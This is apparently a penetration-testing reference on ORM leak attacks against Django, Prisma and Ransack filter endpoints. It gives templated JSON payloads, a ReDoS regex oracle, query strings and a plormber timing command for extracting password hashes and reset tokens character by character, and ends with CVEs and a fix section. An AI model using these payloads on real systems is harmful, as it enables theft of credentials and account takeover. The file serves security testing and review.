# ORM leak (filter-operator data exfiltration) — Open WHEN: an endpoint forwards a user-controlled filter object straight into an ORM query (Django `**request.data`, Prisma `where: req.query.filter`, a Ruby `q[...]` Ransack search) and you want to read fields the response never returns (password hashes, reset tokens)

This is **not** raw-query SQL injection — there is no `'` to break out of, no UNION, no
sqlmap. The app passes a user-supplied filter dict *as-is* into a safe, parameterised ORM
query. The leak comes from abusing the ORM's own legitimate filter operators and relation
traversal to ask yes/no questions about columns that are never selected into the response.
Each request is a boolean oracle ("does field X start with prefix P?"); a response-shape
difference (rows vs. no rows, or a timing difference) extracts the secret one character at
a time. The skill body's "ORM CVE tracking" table is about raw-string sinks; this file is
the orthogonal class where the *safe* API itself is the leak.

### When to suspect it
- A list/search endpoint accepts an arbitrary JSON filter / query-string filter and the
  app does something like `Model.objects.filter(**request.data)` or
  `prisma.x.findMany({ where: req.query.filter })`.
- A `q[...]` parameter (Ruby on Rails + Ransack) controls sorting/filtering.
- You can inject filter *keys*, not just values — the operator suffix is user-controlled.

### Oracle marker
- **Visible**: the matching record appears (or disappears) from the results page.
- **Timing** (Prisma/SQLite, no visible diff): pair the leak filter with an expensive
  `contains` so a *true* prefix runs the heavy clause and the response is slower. The
  `plormber` tool automates this exact time-based walk.

---

## Django (Python)

Vulnerable sink: `User.objects.filter(**request.data)` — the `**` unpack lets the user
control the lookup key, so the operator suffix after `__` is theirs.

Lookup operators that turn a field into a boolean oracle:

```
__startswith   __istartswith   __contains   __icontains   __regex   __gt   __lt
```

Confirm a known value, then walk an unseen field char-by-char:

```json
{"username": "admin", "password__startswith": "p"}
{"username": "admin", "password__startswith": "pb"}
{"username": "admin", "password__startswith": "pbk"}
```

**Relation traversal** — follow ForeignKey/relations with `__` to reach fields on *other*
models the endpoint never meant to expose:

```json
// one-to-one: the article author's password
{"created_by__user__password__contains": "p"}

// many-to-many: hop department -> employees -> user, leak the hash
{"created_by__departments__employees__user__password__startswith": "p",
 "created_by__departments__employees__user__id": 1}
```

**Error-based (ReDoS) leak (Django on MySQL)** — a catastrophic-backtracking regex times
out (HTTP 500) only when the lookahead prefix matches, turning the 500/200 split into the
oracle without needing visible rows:

```json
{"created_by__user__password__regex": "^(?=^pbkdf1).*.*.*.*.*.*.*.*!!!!$"}  // 200, prefix wrong
{"created_by__user__password__regex": "^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$"}  // 500, prefix matched
```

---

## Prisma (Node.js)

Vulnerable sink: `prisma.article.findMany({ where: req.query.filter as any })`.

`include` / `select` over-fetch — pull related records the API never selected:

```json
{"filter": {"include": {"createdBy": true}}}
{"filter": {"select": {"createdBy": {"select": {"password": true}}}}}
```

Relational `startsWith` leak (one-to-one), as a query string or JSON:

```
filter[createdBy][resetToken][startsWith]=06
```

Many-to-many uses nested `some` to chain relations to the target field, then `startsWith`
to binary-search it. No visible diff ⇒ use the time-based variant: pair the prefix test
with a `{"body":{"contains":"<random>"}}` heavy clause so a true prefix is measurably
slower. `plormber` (elttam) drives this:

```bash
plormber prisma-contains \
  --chars '0123456789abcdef' \
  --leak-query-json '{"createdBy": {"resetToken": {"startsWith": "{ORM_LEAK}"}}}' \
  --contains-payload-json '{"body": {"contains": "{RANDOM_STRING}"}}' \
  https://TARGET/articles/time-based
```

---

## Ransack (Ruby on Rails, < 4.0.0)

Ransack auto-exposes every attribute as a `q[<field>_<predicate>]` search key, including
fields on associated models. The `_start` predicate is a prefix oracle (rows vs. empty
page); `_cont` pins a specific user via a related field:

```
GET /posts?q[user_reset_password_token_start]=2     -> rows  (token starts with 2)
GET /posts?q[user_reset_password_token_start]=2f    -> rows  (starts with 2f)
GET /labs?q[creator_roles_name_cont]=superadmin&q[creator_recoveries_key_start]=0
```

---

## Known CVEs (this exact class)
- CVE-2023-47117 — Label Studio ORM leak.
- CVE-2023-31133 — Ghost CMS ORM leak.
- CVE-2023-30843 — Payload CMS ORM leak.

## Fix signal (what to flag in review)
Never forward a raw client object into `filter(**data)` / `where: filter` / a Ransack
search. Allow-list the filterable fields and operators; for Ransack set
`ransackable_attributes` / `ransackable_associations` explicitly.
